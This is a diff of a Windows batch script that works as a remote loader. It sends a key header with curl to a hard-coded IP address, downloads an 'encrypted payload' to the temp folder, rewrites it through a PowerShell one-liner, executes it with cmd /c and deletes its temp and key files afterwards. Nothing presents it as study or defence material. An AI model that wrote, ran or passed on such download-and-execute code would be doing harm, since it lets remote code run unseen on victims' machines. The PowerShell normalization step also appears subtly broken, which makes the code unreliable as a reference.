@@ -1,12 +1,11 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
 echo [INFO] ===== START =====
-echo [INFO] BASE=http://82.29.153.101:8080
-echo [INFO] FILE=%temp%\sc.bat
 
 set BASE=http://82.29.153.101:8080
 set FILE=%temp%\sc.bat
+set TMPFILE=%temp%\raw_payload.txt
 set KEYFILE=%temp%\key.txt
 
 REM ===== TS =====
@@ -31,23 +30,45 @@ if "%KEY%"=="" (
     exit /b 1
 )
 
-REM ===== PAYLOAD =====
+REM ===== DOWNLOAD =====
 echo [INFO] Downloading payload...
-curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
-echo [DEBUG] curl exit code=%errorlevel%
+curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%TMPFILE%"
 
-if exist "%FILE%" (
-    echo [DEBUG] Payload file exists
-) else (
+if not exist "%TMPFILE%" (
     echo [ERROR] Payload file NOT found
     exit /b 1
 )
 
-REM ===== EXEC =====
-echo [INFO] Executing %FILE%
-call "%FILE%"
-echo [DEBUG] Execution exit code=%errorlevel%
+for %%A in ("%TMPFILE%") do set SIZE=%%~zA
+if %SIZE%==0 (
+    echo [ERROR] Payload is empty (%SIZE% bytes)
+    exit /b 1
+)
+
+REM ===== NORMALIZE (CRLF + ASCII) =====
+echo [INFO] Normalizing payload (%SIZE% bytes)...
+powershell -NoP -Command ^
+    "$content = Get-Content '%TMPFILE%' -Raw -Encoding UTF8; ^
+    $content -replace '[^\r\n]', {if ($_ -eq \"`n\" -and $prev -ne \"`r\") {\"`r`n\"} else {$_}} | ^
+    Out-File -Encoding ASCII -NoNewline '%FILE%'"
+
+REM ===== VALIDATE FINAL =====
+for %%A in ("%FILE%") do set FINALSIZE=%%~zA
+if %FINALSIZE%==0 (
+    echo [ERROR] Normalized payload is empty
+    exit /b 1
+)
+
+echo [INFO] Payload normalized (%FINALSIZE% bytes)
+echo [DEBUG] Content preview:
+type "%FILE%"
+
+REM ===== EXECUTE =====
+echo [INFO] Executing payload...
+cmd /c "%FILE%" && echo [SUCCESS] Payload executed OK || echo [ERROR] Payload execution failed
 
 echo [INFO] ===== END =====
 
+REM Cleanup
+del "%TMPFILE%" "%KEYFILE%" 2>nul
 endlocal
